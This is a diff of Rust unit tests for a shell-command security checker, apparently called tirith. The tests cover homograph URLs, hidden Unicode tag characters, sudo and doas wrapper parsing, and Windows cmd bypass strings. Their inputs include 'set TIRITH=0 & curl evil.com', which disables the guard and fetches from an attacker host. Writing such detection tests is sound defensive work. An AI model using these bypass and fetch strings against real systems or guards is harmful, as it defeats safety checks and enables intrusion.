+        // AT SCAN TIME (inside check_bytes_with_ignore).
         let input = "tirith diff https://example.com/\u{E0041}";
         let verdict = analyze(&exec_ctx(input));
         assert!(
@@ -1625,9 +1555,8 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_unicode_tags_outside_still_fires() {
-        // If a unicode-tag byte appears BEFORE "tirith diff" in the command,
-        // it's outside the inert range and UnicodeTags must still fire.
-        // Env-assignment value is a convenient carrier for this.
+        // A unicode-tag byte before `tirith diff` is outside the inert range
+        // and must still fire.
         let input = "FOO=\u{E0041}\u{E0042} tirith diff safe";
         let verdict = analyze(&exec_ctx(input));
         assert!(
@@ -1646,9 +1575,8 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_sudo_wrapper() {
-        // `sudo tirith diff URL` must resolve through the sudo wrapper and
-        // treat the URL as inert. Before the #29-review fix the resolver had
-        // no sudo case, so this path regressed.
+        // `sudo tirith diff URL` — the resolver must see through the sudo
+        // wrapper to recognize the inspection subcommand.
         let input = "sudo tirith diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(
@@ -1666,7 +1594,7 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_sudo_u_flag() {
-        // `sudo -u root tirith diff URL` — sudo takes a value for -u.
+        // `sudo -u root` — -u takes a value; the resolver must skip past it.
         let input = "sudo -u root tirith diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(verdict.action, crate::verdict::Action::Allow);
@@ -1674,13 +1602,12 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_env_assignment_url_still_analyzed() {
-        // `FOO=https://evil.com tirith diff safe-arg` — the URL in the env
-        // assignment is OUTSIDE the inspection arg span and must still be
-        // analyzed. Before the #29-review fix this was silently skipped.
+        // A URL in a leading `FOO=URL` env assignment is OUTSIDE the inspection
+        // arg span and must still be analyzed.
         let input = "FOO=http://evil.com tirith diff safe";
         let verdict = analyze(&exec_ctx(input));
-        // The http URL in FOO= is schemeless-analysis territory — assert it
-        // at minimum surfaces as a finding (details depend on rules layer).
+        // Exact rule behavior for schemeless URLs belongs in the rules layer;
+        // this test just checks the URL reached the extractor at all.
         let urls = verdict.urls_extracted_count.unwrap_or(0);
         assert!(
             !verdict.findings.is_empty() || urls > 0,
@@ -1691,10 +1618,9 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_sudo_dash_s_boolean_flag() {
-        // `-S` is a BOOLEAN sudo flag (read password from stdin). The first
-        // fix erroneously listed it among value-taking flags, which made
-        // `sudo -S tirith diff URL` skip over `tirith` and resolve `diff`
-        // itself as the command. Regression guard — exit should be Allow.
+        // `-S` is a BOOLEAN sudo flag (read password from stdin). Treating it
+        // as value-taking would skip `tirith` and resolve `diff` as the
+        // command word, breaking the carveout.
         let input = "sudo -S tirith diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(
@@ -1712,7 +1638,7 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_sudo_dash_a_boolean_flag() {
-        // Same regression class for `-A` (askpass).
+        // Same boolean-flag class as `-S`, for `-A` (askpass).
         let input = "sudo -A tirith diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(verdict.action, crate::verdict::Action::Allow);
@@ -1720,7 +1646,7 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_sudo_dash_b_boolean_flag() {
-        // Same regression class for `-B` (ring bell).
+        // Same boolean-flag class as `-S`, for `-B` (ring bell).
         let input = "sudo -B tirith diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(verdict.action, crate::verdict::Action::Allow);
@@ -1728,7 +1654,7 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_doas_wrapper() {
-        // `doas` is an alias for sudo; same resolver branch.
+        // `doas` is an OpenBSD-flavored sudo alias; same resolver branch.
         let input = "doas tirith diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(verdict.action, crate::verdict::Action::Allow);
@@ -1736,13 +1662,10 @@ mod tests {
 
     #[test]
     fn test_tirith_inert_arg_range_no_false_match_inside_flag_value() {
-        // `tirith --config=diff diff URL` — naive substring search for "diff"
-        // would match inside `--config=diff` and produce a too-wide inert
-        // range. `find_subcommand_token` must require a whitespace boundary.
+        // A naive substring search would match "diff" inside `--config=diff`.
+        // The subcommand lookup must require a whitespace word boundary.
         let input = "tirith --config=diff diff https://example.com";
         let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
-        // The inert range must start AFTER the second "diff" word, not the
-        // first occurrence inside --config=diff.
         let inert_slice = &input[range.clone()];
         assert!(
             inert_slice.contains("https://example.com"),
@@ -1756,7 +1679,6 @@ mod tests {
 
     #[test]
     fn test_cmd_bypass_bare_set() {
-        // `set TIRITH=0 & cmd` is a real Cmd bypass
         assert!(find_inline_bypass(
             "set TIRITH=0 & curl evil.com",
             ShellType::Cmd
@@ -1765,7 +1687,8 @@ mod tests {
 
     #[test]
     fn test_cmd_bypass_whole_token_quoted() {
-        // `set "TIRITH=0" & cmd` — whole-token quoting, real bypass
+        // Whole-token quoting IS a real bypass — the quotes surround the whole
+        // `TIRITH=0` assignment.
         assert!(find_inline_bypass(
             "set \"TIRITH=0\" & curl evil.com",
             ShellType::Cmd
@@ -1774,7 +1697,8 @@ mod tests {
 
     #[test]
     fn test_cmd_no_bypass_inner_double_quotes() {
-        // `set TIRITH="0" & cmd` — cmd.exe stores literal "0", NOT a bypass
+        // cmd.exe stores literal `"0"` (quotes included), so `set TIRITH="0"`
+        // does NOT bypass.
         assert!(!find_inline_bypass(
             "set TIRITH=\"0\" & curl evil.com",
             ShellType::Cmd
@@ -1783,7 +1707,8 @@ mod tests {
 
     #[test]
     fn test_cmd_no_bypass_single_quotes() {
-        // `set TIRITH='0' & cmd` — single quotes are literal in cmd.exe, NOT a bypass
+        // Single quotes are literal in cmd.exe (not syntax), so the value is
+        // `'0'`, not `0`.
         assert!(!find_inline_bypass(
             "set TIRITH='0' & curl evil.com",
             ShellType::Cmd
